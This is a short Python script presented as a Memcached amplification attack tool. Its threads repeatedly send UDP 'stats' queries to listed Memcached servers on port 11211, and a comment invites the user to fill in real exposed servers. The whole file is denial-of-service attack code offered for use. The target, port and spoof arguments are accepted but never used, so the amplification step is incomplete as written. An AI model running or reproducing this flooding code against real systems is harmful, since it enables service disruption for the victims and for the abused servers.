import socket
import threading
import time

MEMCACHED_SERVERS = [
    "127.0.0.1",  # replace with actual Memcached servers exposed
]

class MemcachedAmplification:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()

    def _send_memcached(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        while not self.stop_event.is_set():
            for server in MEMCACHED_SERVERS:
                try:
                    sock.sendto(query, (server, 11211))
                except Exception:
                    pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_memcached)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = MemcachedAmplification(target, port, threads, duration, spoof)
    flood.start()
